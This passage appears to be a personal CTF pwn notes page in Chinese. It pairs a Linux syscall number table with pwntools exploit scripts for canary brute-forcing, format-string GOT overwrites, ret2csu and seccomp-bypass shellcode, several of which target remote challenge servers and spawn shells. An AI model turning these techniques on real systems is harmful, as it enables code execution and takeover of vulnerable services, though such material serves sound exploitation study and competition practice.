__NR_tgkill 270#define __NR_utimes 271#define __NR_fadvise64_64 272#define __NR_vserver 273#define __NR_mbind 274#define __NR_get_mempolicy 275#define __NR_set_mempolicy 276#define __NR_mq_open 277#define __NR_mq_unlink 278#define __NR_mq_timedsend 279#define __NR_mq_timedreceive 280#define __NR_mq_notify 281#define __NR_mq_getsetattr 282#define __NR_kexec_load 283#define __NR_waitid 284#define __NR_add_key 286#define __NR_request_key 287#define __NR_keyctl 288#define __NR_ioprio_set 289#define __NR_ioprio_get 290#define __NR_inotify_init 291#define __NR_inotify_add_watch 292#define __NR_inotify_rm_watch 293#define __NR_migrate_pages 294#define __NR_openat 295#define __NR_mkdirat 296#define __NR_mknodat 297#define __NR_fchownat 298#define __NR_futimesat 299#define __NR_fstatat64 300#define __NR_unlinkat 301#define __NR_renameat 302#define __NR_linkat 303#define __NR_symlinkat 304#define __NR_readlinkat 305#define __NR_fchmodat 306#define __NR_faccessat 307#define __NR_pselect6 308#define __NR_ppoll 309#define __NR_unshare 310#define __NR_set_robust_list 311#define __NR_get_robust_list 312#define __NR_splice 313#define __NR_sync_file_range 314#define __NR_tee 315#define __NR_vmsplice 316#define __NR_move_pages 317#define __NR_getcpu 318#define __NR_epoll_pwait 319#define __NR_utimensat 320#define __NR_signalfd 321#define __NR_timerfd_create 322#define __NR_eventfd 323#define __NR_fallocate 324#define __NR_timerfd_settime 325#define __NR_timerfd_gettime 326#define __NR_signalfd4 327#define __NR_eventfd2 328#define __NR_epoll_create1 329#define __NR_dup3 330#define __NR_pipe2 331#define __NR_inotify_init1 332#define __NR_preadv 333#define __NR_pwritev 334#define __NR_rt_tgsigqueueinfo 335#define __NR_perf_event_open 336#define __NR_recvmmsg 337#define __NR_fanotify_init 338#define __NR_fanotify_mark 339#define __NR_prlimit64 340#define __NR_name_to_handle_at 341#define __NR_open_by_handle_at 342#define __NR_clock_adjtime 343#define __NR_syncfs 344#define __NR_sendmmsg 345#define __NR_setns 346#define __NR_process_vm_readv 347#define __NR_process_vm_writev 348#define __NR_kcmp 349#define __NR_finit_module 350#define __NR_sched_setattr 351#define __NR_sched_getattr 352#define __NR_renameat2 353#define __NR_seccomp 354#define __NR_getrandom 355#define __NR_memfd_create 356#define __NR_bpf 357#define __NR_execveat 358#define __NR_socket 359#define __NR_socketpair 360#define __NR_bind 361#define __NR_connect 362#define __NR_listen 363#define __NR_accept4 364#define __NR_getsockopt 365#define __NR_setsockopt 366#define __NR_getsockname 367#define __NR_getpeername 368#define __NR_sendto 369#define __NR_sendmsg 370#define __NR_recvfrom 371#define __NR_recvmsg 372#define __NR_shutdown 373#define __NR_userfaultfd 374#define __NR_membarrier 375#define __NR_mlock2 376#define __NR_copy_file_range 377#define __NR_preadv2 378#define __NR_pwritev2 379#endif /* _ASM_X86_UNISTD_32_H */ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335#64位#ifndef _ASM_X86_UNISTD_64_H#define _ASM_X86_UNISTD_64_H 1#define __NR_read 0#define __NR_write 1#define __NR_open 2#define __NR_close 3#define __NR_stat 4#define __NR_fstat 5#define __NR_lstat 6#define __NR_poll 7#define __NR_lseek 8#define __NR_mmap 9#define __NR_mprotect 10#define __NR_munmap 11#define __NR_brk 12#define __NR_rt_sigaction 13#define __NR_rt_sigprocmask 14#define __NR_rt_sigreturn 15#define __NR_ioctl 16#define __NR_pread64 17#define __NR_pwrite64 18#define __NR_readv 19#define __NR_writev 20#define __NR_access 21#define __NR_pipe 22#define __NR_select 23#define __NR_sched_yield 24#define __NR_mremap 25#define __NR_msync 26#define __NR_mincore 27#define __NR_madvise 28#define __NR_shmget 29#define __NR_shmat 30#define __NR_shmctl 31#define __NR_dup 32#define __NR_dup2 33#define __NR_pause 34#define __NR_nanosleep 35#define __NR_getitimer 36#define __NR_alarm 37#define __NR_setitimer 38#define __NR_getpid 39#define __NR_sendfile 40#define __NR_socket 41#define __NR_connect 42#define __NR_accept 43#define __NR_sendto 44#define __NR_recvfrom 45#define __NR_sendmsg 46#define __NR_recvmsg 47#define __NR_shutdown 48#define __NR_bind 49#define __NR_listen 50#define __NR_getsockname 51#define __NR_getpeername 52#define __NR_socketpair 53#define __NR_setsockopt 54#define __NR_getsockopt 55#define __NR_clone 56#define __NR_fork 57#define __NR_vfork 58#define __NR_execve 59#define __NR_exit 60#define __NR_wait4 61#define __NR_kill 62#define __NR_uname 63#define __NR_semget 64#define __NR_semop 65#define __NR_semctl 66#define __NR_shmdt 67#define __NR_msgget 68#define __NR_msgsnd 69#define __NR_msgrcv 70#define __NR_msgctl 71#define __NR_fcntl 72#define __NR_flock 73#define __NR_fsync 74#define __NR_fdatasync 75#define __NR_truncate 76#define __NR_ftruncate 77#define __NR_getdents 78#define __NR_getcwd 79#define __NR_chdir 80#define __NR_fchdir 81#define __NR_rename 82#define __NR_mkdir 83#define __NR_rmdir 84#define __NR_creat 85#define __NR_link 86#define __NR_unlink 87#define __NR_symlink 88#define __NR_readlink 89#define __NR_chmod 90#define __NR_fchmod 91#define __NR_chown 92#define __NR_fchown 93#define __NR_lchown 94#define __NR_umask 95#define __NR_gettimeofday 96#define __NR_getrlimit 97#define __NR_getrusage 98#define __NR_sysinfo 99#define __NR_times 100#define __NR_ptrace 101#define __NR_getuid 102#define __NR_syslog 103#define __NR_getgid 104#define __NR_setuid 105#define __NR_setgid 106#define __NR_geteuid 107#define __NR_getegid 108#define __NR_setpgid 109#define __NR_getppid 110#define __NR_getpgrp 111#define __NR_setsid 112#define __NR_setreuid 113#define __NR_setregid 114#define __NR_getgroups 115#define __NR_setgroups 116#define __NR_setresuid 117#define __NR_getresuid 118#define __NR_setresgid 119#define __NR_getresgid 120#define __NR_getpgid 121#define __NR_setfsuid 122#define __NR_setfsgid 123#define __NR_getsid 124#define __NR_capget 125#define __NR_capset 126#define __NR_rt_sigpending 127#define __NR_rt_sigtimedwait 128#define __NR_rt_sigqueueinfo 129#define __NR_rt_sigsuspend 130#define __NR_sigaltstack 131#define __NR_utime 132#define __NR_mknod 133#define __NR_uselib 134#define __NR_personality 135#define __NR_ustat 136#define __NR_statfs 137#define __NR_fstatfs 138#define __NR_sysfs 139#define __NR_getpriority 140#define __NR_setpriority 141#define __NR_sched_setparam 142#define __NR_sched_getparam 143#define __NR_sched_setscheduler 144#define __NR_sched_getscheduler 145#define __NR_sched_get_priority_max 146#define __NR_sched_get_priority_min 147#define __NR_sched_rr_get_interval 148#define __NR_mlock 149#define __NR_munlock 150#define __NR_mlockall 151#define __NR_munlockall 152#define __NR_vhangup 153#define __NR_modify_ldt 154#define __NR_pivot_root 155#define __NR__sysctl 156#define __NR_prctl 157#define __NR_arch_prctl 158#define __NR_adjtimex 159#define __NR_setrlimit 160#define __NR_chroot 161#define __NR_sync 162#define __NR_acct 163#define __NR_settimeofday 164#define __NR_mount 165#define __NR_umount2 166#define __NR_swapon 167#define __NR_swapoff 168#define __NR_reboot 169#define __NR_sethostname 170#define __NR_setdomainname 171#define __NR_iopl 172#define __NR_ioperm 173#define __NR_create_module 174#define __NR_init_module 175#define __NR_delete_module 176#define __NR_get_kernel_syms 177#define __NR_query_module 178#define __NR_quotactl 179#define __NR_nfsservctl 180#define __NR_getpmsg 181#define __NR_putpmsg 182#define __NR_afs_syscall 183#define __NR_tuxcall 184#define __NR_security 185#define __NR_gettid 186#define __NR_readahead 187#define __NR_setxattr 188#define __NR_lsetxattr 189#define __NR_fsetxattr 190#define __NR_getxattr 191#define __NR_lgetxattr 192#define __NR_fgetxattr 193#define __NR_listxattr 194#define __NR_llistxattr 195#define __NR_flistxattr 196#define __NR_removexattr 197#define __NR_lremovexattr 198#define __NR_fremovexattr 199#define __NR_tkill 200#define __NR_time 201#define __NR_futex 202#define __NR_sched_setaffinity 203#define __NR_sched_getaffinity 204#define __NR_set_thread_area 205#define __NR_io_setup 206#define __NR_io_destroy 207#define __NR_io_getevents 208#define __NR_io_submit 209#define __NR_io_cancel 210#define __NR_get_thread_area 211#define __NR_lookup_dcookie 212#define __NR_epoll_create 213#define __NR_epoll_ctl_old 214#define __NR_epoll_wait_old 215#define __NR_remap_file_pages 216#define __NR_getdents64 217#define __NR_set_tid_address 218#define __NR_restart_syscall 219#define __NR_semtimedop 220#define __NR_fadvise64 221#define __NR_timer_create 222#define __NR_timer_settime 223#define __NR_timer_gettime 224#define __NR_timer_getoverrun 225#define __NR_timer_delete 226#define __NR_clock_settime 227#define __NR_clock_gettime 228#define __NR_clock_getres 229#define __NR_clock_nanosleep 230#define __NR_exit_group 231#define __NR_epoll_wait 232#define __NR_epoll_ctl 233#define __NR_tgkill 234#define __NR_utimes 235#define __NR_vserver 236#define __NR_mbind 237#define __NR_set_mempolicy 238#define __NR_get_mempolicy 239#define __NR_mq_open 240#define __NR_mq_unlink 241#define __NR_mq_timedsend 242#define __NR_mq_timedreceive 243#define __NR_mq_notify 244#define __NR_mq_getsetattr 245#define __NR_kexec_load 246#define __NR_waitid 247#define __NR_add_key 248#define __NR_request_key 249#define __NR_keyctl 250#define __NR_ioprio_set 251#define __NR_ioprio_get 252#define __NR_inotify_init 253#define __NR_inotify_add_watch 254#define __NR_inotify_rm_watch 255#define __NR_migrate_pages 256#define __NR_openat 257#define __NR_mkdirat 258#define __NR_mknodat 259#define __NR_fchownat 260#define __NR_futimesat 261#define __NR_newfstatat 262#define __NR_unlinkat 263#define __NR_renameat 264#define __NR_linkat 265#define __NR_symlinkat 266#define __NR_readlinkat 267#define __NR_fchmodat 268#define __NR_faccessat 269#define __NR_pselect6 270#define __NR_ppoll 271#define __NR_unshare 272#define __NR_set_robust_list 273#define __NR_get_robust_list 274#define __NR_splice 275#define __NR_tee 276#define __NR_sync_file_range 277#define __NR_vmsplice 278#define __NR_move_pages 279#define __NR_utimensat 280#define __NR_epoll_pwait 281#define __NR_signalfd 282#define __NR_timerfd_create 283#define __NR_eventfd 284#define __NR_fallocate 285#define __NR_timerfd_settime 286#define __NR_timerfd_gettime 287#define __NR_accept4 288#define __NR_signalfd4 289#define __NR_eventfd2 290#define __NR_epoll_create1 291#define __NR_dup3 292#define __NR_pipe2 293#define __NR_inotify_init1 294#define __NR_preadv 295#define __NR_pwritev 296#define __NR_rt_tgsigqueueinfo 297#define __NR_perf_event_open 298#define __NR_recvmmsg 299#define __NR_fanotify_init 300#define __NR_fanotify_mark 301#define __NR_prlimit64 302#define __NR_name_to_handle_at 303#define __NR_open_by_handle_at 304#define __NR_clock_adjtime 305#define __NR_syncfs 306#define __NR_sendmmsg 307#define __NR_setns 308#define __NR_getcpu 309#define __NR_process_vm_readv 310#define __NR_process_vm_writev 311#define __NR_kcmp 312#define __NR_finit_module 313#define __NR_sched_setattr 314#define __NR_sched_getattr 315#define __NR_renameat2 316#define __NR_seccomp 317#define __NR_getrandom 318#define __NR_memfd_create 319#define __NR_kexec_file_load 320#define __NR_bpf 321#define __NR_execveat 322#define __NR_userfaultfd 323#define __NR_membarrier 324#define __NR_mlock2 325#define __NR_copy_file_range 326#define __NR_preadv2 327#define __NR_pwritev2 328#endif /* _ASM_X86_UNISTD_64_H */ LINUX12345678910111213141516kali网络问题apt-get install geditservice NetworkManager stoprm /var/lib/NetworkManager/NetworkManager.state service NetworkManager start 解决办法之一是可以在 WSL 中使用以下命令删除这些 Zone.Identifier 数据流：bash复制代码find . -name &quot;*:Zone.Identifier&quot; -exec rm &#123;&#125; \\;linux gdb第二窗口输出vim ~/.gdbinit在文件里加入set context-output /dev/pts/2 修改程序使用的libc版本12345678strings libc.so.6 | grep &quot;GNU&quot; #查看libc版本cd glibc-all-in-onecat list./download 2.27-3ubuntu1.6_amd64 #下载对应的libc版本patchelf --set-interpreter /home/kali/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/ld-linux-x86-64.so.2 --set-rpath /home/kali/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/ ./filename#修改文件的libc版本 循环爆破1234567891011121314151617for i in range(0xff): try: r = process([&quot;./ld-linux-x86-64.so.2&quot;, file_name], env=&#123;&quot;LD_PRELOAD&quot;: &quot;./libc.so.6&quot;&#125;) p = b&quot;&quot; p += b&#x27;A&#x27; * 0x100 p += b&#x27;B&#x27; * 8 p += p64(i)[:1] r.send(p) r.recvuntil(b&#x27;BBBBBBBB&#x27;) # print(r.recvuntil(b&#x27;BBBBBBBB&#x27;)) r.sendline(b&quot;111111111111&quot;) print(r.recvuntil(b&#x27;111111111111&#x27;)) print(hex(i)) except : continue exp head1234567891011121314151617181920212223242526272829from pwn import *from LibcSearcher import *filename=&#x27;./read&#x27;a=1context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)if a: io=remote(&#x27;39.106.48.123&#x27;,42877)else: io=process(filename) gdb.attach(io)elf=ELF(filename)libc=ELF(&#x27;./libc.so.6&#x27;)#--------Common command abbreviation---------------s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda num=None: io.recv(num)ru = lambda text : io.recvuntil(text)rl = lambda : io.recvline()tb = lambda num : str(num).encode()uu32 = lambda flag=b&#x27;\\n&#x27;, off=1, len=4: u32((r(flag) if isinstance(flag,int) else ru(flag))[-off-len:-off].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda flag=b&#x27;\\n&#x27;, off=1, len=8: u64((r(flag) if isinstance(flag,int) else ru(flag))[-off-len:-off].ljust(8, b&quot;\\x00&quot;)) # recive Bytes numberrx = lambda nos=b&#x27;\\n&#x27;, off=1, len=None: int((r(nos)if isinstance(nos,int) else ru(nos))[-off-len if isinstance(len,int) else 0:-off],16) # recive Hex numberlg = lambda x, flag=None: log.info(f&quot;&#123;flag if flag else&#x27;,&#x27;.join([k for k,v in globals().items() if v==x])&#125;:\\t&#123;x:#x&#125;&quot;if isinstance(x,int)else x) # output Valueia = lambda : io.interactive()ss = lambda time=0.1: pause() if mode == 2 else sleep(time) 不用脚本的pwn推荐文章一次不用脚本的pwn解题 - 知乎 (zhihu.com) calc1234567891011from pwn import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)s=remote(&quot;47.97.58.52&quot;,40010)for i in range(100): s.recvuntil(b&quot;====\\n&quot;) dat=eval(s.recvuntil(b&quot;=&quot;)[:-1]) print(dat) s.sendline(str(dat).encode())s.sendline(b&quot;cat flag&quot;)s.recv() randomexp12345678910111213dll = cdll.LoadLibrary(&quot;./libc.so.6&quot;)dll.srand(dll.time(0))fd = dll.rand()%100+3print(fd+3)ru(&#x27;turn!\\n&#x27;)sl(b&#x27;0&#x27;)sleep(1)sl(str(fd))sleep(1)sl(b&#x27;1&#x27;)sleep(1)sl(b&#x27;2&#x27;)ia() 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *from ctypes import *r = process(&quot;./pwn&quot;)def dbg(): gdb.attach(r)libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)seed = libc.time(0)libc.srand(seed)&quot;&quot;&quot;通过 cdll.LoadLibrary() 加载本地的 libc.so.6 库，并使用 libc.time(0) 获取当前时间作为种子，然后调用 libc.srand(seed) 初始化随机数生成器。这部分代码的目的是模拟远程服务中的随机数生成过程，确保你的本地随机数序列和远程的一致&quot;&quot;&quot;canary = b&#x27;\\x00&#x27;for i in range(7): for a in range(256): num = libc.rand() % 50 r.sendlineafter(b&#x27;BaseCTF&#x27;,str(num)) p = b&#x27;a&#x27; * 0x68 + canary + p8(a) r.send(p) r.recvuntil(&#x27;welcome\\n&#x27;) rec = r.readline() if b&#x27;smashing&#x27; not in rec: print(f&quot;No.&#123;i + 1&#125; byte is &#123;hex(a)&#125;&quot;) canary += p8(a) breakprint(f&quot;canary is &#123;hex(u64(canary))&#125;&quot;)&quot;&quot;&quot;canary 初始化为 1 字节的空字节（b&#x27;\\x00&#x27;），这是因为 canary 的第一个字节通常是 0。使用两层循环来逐个字节泄露 canary。内层循环尝试 256 个可能的字节值，外层循环处理 canary 的剩余 7 个字节。每次发送构造的输入后，通过检查响应是否包含 &quot;smashing&quot; 字符串来判断是否溢出。如果没有溢出，说明该字节正确，将其添加到 canary 中。成功后打印出每个字节的值，直到完整的 canary 被泄露&quot;&quot;&quot;shell = 0x02B1while(1): for i in range(16): num = libc.rand() % 50 r.sendline(str(num)) p = b&#x27;A&#x27; * 0x68 + canary + b&#x27;A&#x27; * 0x8 + p16(shell) r.send(p) rec = r.readline() print(rec) if b&#x27;welcome&#x27; in rec: r.readline() shell += 0x1000 continue else: break&quot;&quot;&quot;在泄露 canary 之后，代码进入一个无限循环来寻找合适的返回地址（猜测与 shellcode 执行地址有关）。这里你构造的 payload 是：填充 0x68 字节 + 已泄露的 canary + 8 字节的填充 + p16(shell)。每次递增 shell 的值，尝试找到正确的返回地址。当返回信息不包含 &quot;welcome&quot; 时，意味着可能找到了正确的地址。shell 地址以 0x1000 为步长递增，逐个内存页面检查。&quot;&quot;&quot;r.interactive() canaryexp爆破canary12345678910111213141516171819202122232425262728293031323334353637#coding:utf-8from pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)#8.147.132.32 18828p=remote(&#x27;8.147.132.32&#x27;,18828)#p=process(&#x27;./ezcanary&#x27;)#elf=ELF(&#x27;./ezcanary&#x27;)#libc=ELF(&#x27;./libc.so.6&#x27;)backdoor=0x401236canary = b&#x27;\\x00&#x27;# 猜测 canary 的前三个字节，逐字节暴力破解for k in range(7): for i in range(256): p.recvuntil(&quot;\\x9f\\x0a&quot;) p.send(b&#x27;a&#x27;*0x58 + canary + p8(i)) a = p.recv() p.recv() p.sendline(b&#x27;1&#x27;) if b&quot;smashing&quot; not in a: canary += p8(i) break print(canary)# Canary 完整破解后，可以继续构造下一步的 exploitp.recvuntil(b&#x27;\\x9f\\x0a&#x27;)p.sendline(b&#x27;1&#x27;)p.recv()p.sendline(b&#x27;cat flag&#x27;)p.recvuntil(&#x27;flag is one_by_one_bruteforce&#x27;)payload=b&#x27;a&#x27;*0x58+canary+b&#x27;a&#x27;*8+p64(backdoor)p.sendline(payload)p.interactive() fmttips123fmtarg addr#就可以获取这是printf的第几个参数，在gdb调试中非栈上格式化字符串的技巧https://www.freebuf.com/vuls/284210.html Linux下程序的运行流程如右图所示 在main函数结束后退出程序时，会执行fini_array内的函数，在IDA中可以通过ctrl+s看到各个段的地址 exp123456789101112131415161718192021222324from pwn import *context.log_level=&#x27;debug&#x27;io=process(&#x27;./wdb_2018_2nd_easyfmt&#x27;)elf=ELF(&#x27;./wdb_2018_2nd_easyfmt&#x27;)libc=ELF(&#x27;/usr/lib/freelibs/i386/2.23-0ubuntu11.2_i386/libc-2.23.so&#x27;)printf_got=elf.got[&#x27;printf&#x27;]payload=&#x27;%3$p&#x27;io.recvuntil(&#x27;Do you know repeater?\\n&#x27;)io.send(payload)sleep(0.2)libc_base=int(io.recv(10),16)-0x9079bsystem_addr=libc_base+libc.symbols[&#x27;system&#x27;]log.success(&#x27;libc_base =&gt; &#123;&#125;&#x27;.format(hex(libc_base)))log.success(&#x27;system_addr =&gt; &#123;&#125;&#x27;.format(hex(system_addr)))system_low=system_addr&amp;0xffffsystem_high=(system_addr&gt;&gt;16)&amp;0xffffpayload=p32(printf_got)+p32(printf_got+2)payload+=&#x27;%&#x27;+str(system_low-8)+&#x27;c%6$hn&#x27;payload+=&#x27;%&#x27;+str(system_high-system_low)+&#x27;c%7$hn’io.send(payload)sleep(0.2)io.send(&#x27;/bin/sh\\x00&#x27;)io.interactive() 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#只有一次的格式化字符串#通过劫持__stack_chk_fail，导致每次canary检测错误，回到主函数from pwn import * context (os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;,&#x27;-l&#x27;,&#x27;140&#x27;]pwnfile = &#x27;./vuln&#x27;elf = ELF(pwnfile)libc = ELF(&#x27;libc.so.6&#x27;)#p = process(pwnfile)p = remote(&#x27;challenge.basectf.fun&#x27;,35819)fini_array=0x403118main_addr=0x40121Bputs_got=elf.got[&#x27;printf&#x27;]__stack_chk_fail = 0x403320 # gotprintf_got = 0x403328payload = b&quot;%&quot; + str(0x1b).encode() + b&quot;c%22$hhn&quot;payload += b&quot;%&quot; + str((0x100 - 0x1b) + (0x12)).encode() + b&quot;c%23$hhn&quot;payload += b&quot;%&quot; + str((0x100 - 0x12) + (0x40)).encode() + b&quot;c%24$hhn&quot;payload += b&#x27;---A%25$s&#x27;payload = payload.ljust(0x80,b&#x27;a&#x27;)payload += p64(__stack_chk_fail)payload += p64(__stack_chk_fail + 0x1)payload += p64(__stack_chk_fail + 0x2)payload += p64(elf.got[&#x27;printf&#x27;])payload = payload.ljust(0x110,b&quot;a&quot;)p.recvuntil(b&#x27;--\\n&#x27;)p.send(payload)p.recvuntil(b&#x27;---A&#x27;)libc_base=u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))-libc.sym[&#x27;printf&#x27;]print(&#x27;libc_addr-&gt;&#x27;,hex(libc_base))sys_addr=libc_base+libc.sym[&#x27;system&#x27;]print(&#x27;system_addr-&gt;&#x27;,hex(sys_addr))#p.send(b&#x27;/bin/sh\\x00&#x27;)system1=sys_addr&amp;0xffsystem2=(sys_addr&gt;&gt;8)&amp;0xffsystem3=(sys_addr&gt;&gt;16)&amp;0xffsystem4=(sys_addr&gt;&gt;32)&amp;0xffpayload = b&quot;%&quot; + str(system1).encode() + b&quot;c%22$hhn&quot;payload += b&quot;%&quot; + str(0x100 - system1 + system2).encode() + b&quot;c%23$hhn&quot;payload += b&quot;%&quot; + str(0x100 - system2 + system3).encode() + b&quot;c%24$hhn&quot;payload = payload.ljust(0x80,b&#x27;a&#x27;)payload += p64(printf_got)payload += p64(printf_got + 0x1)payload += p64(printf_got + 0x2)payload = payload.ljust(0x110,b&#x27;a&#x27;)p.send(payload)p.send(&#x27;/bin/sh\\x00&#x27;)p.interactive() hn,hhn组合覆盖1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#39.106.48.123 15520io=remote(&#x27;39.106.48.123&#x27;,15520)#io=process(&#x27;./fmt&#x27;)elf=ELF(&#x27;./fmt&#x27;)libc=ELF(&#x27;./libc.so.6&#x27;)puts_got=elf.got[&#x27;puts&#x27;]printf_got=elf.got[&#x27;printf&#x27;]#puts 0x7f01dee80e50#system 0x7f01dee50d70#printf 0x7f01dee606f0payload=b&#x27;%9$saaaa&#x27;payload+=p64(puts_got)#payload+=b&#x27;%15$paac&#x27;#canaryio.recvuntil(&#x27;data: &#x27;)io.send(payload)puts_addr=u64(io.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(puts_addr))libc_base=puts_addr-libc.sym[&#x27;puts&#x27;]system_addr=libc_base+libc.sym[&#x27;system&#x27;]printf_addr=libc_base+libc.sym[&#x27;printf&#x27;]binsh=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))print(hex(system_addr))print(hex(printf_addr))io.recv()#io.recvuntil(&#x27;data: &#x27;)&quot;&quot;&quot;offset=8payload1=fmtstr_payload(offset, &#123;puts_got: p64(system_addr)&#125;)print(len(payload1))#io.recvuntil(&#x27;\\x40&#x27;)&quot;&quot;&quot;system1=system_addr&amp;0xffffsystem2=(system_addr&gt;&gt;16)&amp;0xff#system3=(system_addr&gt;&gt;16)&amp;0xff#system4=(system_addr&gt;&gt;32)&amp;0xffpayload1 = b&quot;%&quot;+ str(system2).encode() + b&quot;c%12$hhn&quot;payload1 += b&quot;%&quot; + str(system1 -system2 ).encode() + b&quot;c%13$hn&quot;payload1 = payload1.ljust(0x20,b&#x27;a&#x27;)payload1 += p64(printf_got + 0x2)payload1 += p64(printf_got)print(len(payload1))io.send(payload1)payload2 = b&#x27;/bin/sh\\x00&#x27;io.recv()io.send(payload2)io.interactive() ret2csu12345678910111213141516171819202122232425262728293031323334353637383940414243text:0000000000400540 public __libc_csu_init.text:0000000000400540 __libc_csu_init proc near ; DATA XREF: _start+16↑o.text:0000000000400540 ; __unwind &#123;.text:0000000000400540 push r15.text:0000000000400542 push r14.text:0000000000400544 mov r15d, edi.text:0000000000400547 push r13.text:0000000000400549 push r12.text:000000000040054B lea r12, __frame_dummy_init_array_entry.text:0000000000400552 push rbp.text:0000000000400553 lea rbp, __do_global_dtors_aux_fini_array_entry.text:000000000040055A push rbx.text:000000000040055B mov r14, rsi.text:000000000040055E mov r13, rdx.text:0000000000400561 sub rbp, r12.text:0000000000400564 sub rsp, 8.text:0000000000400568 sar rbp, 3.text:000000000040056C call _init_proc.text:0000000000400571 test rbp, rbp.text:0000000000400574 jz short loc_400596.text:0000000000400576 xor ebx, ebx.text:0000000000400578 nop dword ptr [rax+rax+00000000h].text:0000000000400580.text:0000000000400580 loc_400580: ; CODE XREF: __libc_csu_init+54↓j.text:0000000000400580 mov rdx, r13.text:0000000000400583 mov rsi, r14.text:0000000000400586 mov edi, r15d.text:0000000000400589 call qword ptr [r12+rbx*8].text:000000000040058D add rbx, 1.text:0000000000400591 cmp rbx, rbp.text:0000000000400594 jnz short loc_400580.text:0000000000400596.text:0000000000400596 loc_400596: ; CODE XREF: __libc_csu_init+34↑j.text:0000000000400596 add rsp, 8.text:000000000040059A pop rbx.text:000000000040059B pop rbp.text:000000000040059C pop r12.text:000000000040059E pop r13.text:00000000004005A0 pop r14.text:00000000004005A2 pop r15.text:00000000004005A4 retn.text:00000000004005A4 ; &#125; // starts at 400540.text:00000000004005A4 __libc_csu_init endp exp1234567891011121314151617181920212223242526272829303132333435363738#coding:utf-8from pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)p=process(&#x27;./a&#x27;)e=ELF(&#x27;./a&#x27;)pop_rdi_addr=0x4007f3print(&#x27;pid&#x27;+str(proc.pidof(p)))offset=0x60syscall_addr=0x40077Ewrite_addr=0x400773csu_gadget1=0x4007EAcsu_gadget2=0x4007D0term_proc=0x600e50bss_addr=0x601060payload=(offset+8)*&#x27;a&#x27;payload+=p64(csu_gadget1)payload+=p64(0) #rbxpayload+=p64(1)#rbppayload+=p64(term_proc)#r12 空函数#第一次ret2csu的目的是传read函数参数，并且在最后的ret去执行系统调用，第一次不需要用到call，因此call一个空函数payload+=p64(59)#r13 rdx #执行一次syscall之后，rax就变成了0x3bpayload+=p64(bss_addr)#r14 #rsi #将/bin/sh写入bss段payload+=p64(0)#r15 #rdipayload+=p64(csu_gadget2)payload+=&#x27;a&#x27;*8#下面的48个数据不用垃圾填充，直接进行下一轮涉及参数，这8个垃圾数据填充的是add rsp,8payload+=p64(0)payload+=p64(1)payload+=p64(bss_addr+0x8)#此时用call来执行输入到bss段里的syscallpayload+=p64(0)payload+=p64(0)payload+=p64(bss_addr)payload+=p64(syscall_addr)payload+=p64(csu_gadget2)p.sendafter(&#x27;Welcome to VNCTF! This is a easy competition.///\\n&#x27;,payload)payload=&#x27;/bin/sh\\x00&#x27;+p64(syscall_addr)+&#x27;\\x00&#x27;.ljust(59,&#x27;\\x00&#x27;)#这里一定要凑齐59，使得read函数的返回值，也就是让rax变成59p.sendline(payload)p.interactive() orwseccomp tips123456https://blog.csdn.net/qq_54218833/article/details/126082743?spm=1001.2014.3001.5502限制read第一个参数必须为0第一种方法，利用dup2(3,0)将open返回的文件描述符修改，可以read第一个参数是0，就可以读取到flag里的内容了第二种方法，由于012都用做标准输入输出，报错占用了，所以文件描述都是从3开始的，倘若我们再open之前close(0)之后，再进行open的话，那么文件描述符就是0了，这样的话就可以read了。 exp普通orw1234567mmap=0x123000#orw=shellcraft.open(&#x27;./flag.txt&#x27;)orw=shellcraft.open(&#x27;./flag&#x27;)orw+=shellcraft.read(3,mmap,0x50)orw+=shellcraft.write(1,mmap,0x50) openat+sendfile12345shellcode = &#x27;&#x27;&#x27; mov rsp, 0x4040c0&#x27;&#x27;&#x27;shellcode += shellcraft.openat(-100, &quot;/flag&quot;, 0, 0)shellcode += shellcraft.sendfile(1, 3, 0, 0x100) 123456789101112131415161718192021222324252627#把shell函数和orw给ban了，其实方法很多，openat打开，然后sendfile直接读就行from pwn import *context.arch = &quot;amd64&quot;io=process(&#x27;./pwn&#x27;)io.recv()shellcode = &#x27;&#x27;&#x27; mov rax, 0x67616c662f2e ###./flag push rax xor rdi, rdi sub rdi, 100 mov rsi, rsp xor edx, edx xor r10, r10 push 0x101 pop rax syscall mov rdi,1 mov rsi,3 push 0 mov rdx,rsp mov r10,0x100 push 40 pop rax syscall &#x27;&#x27;&#x27;io.sendline(asm(shellcode))io.interactive() openat,writev,preadv21234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#不含\\x00#coding:utf-8from pwn import *from LibcSearcher import 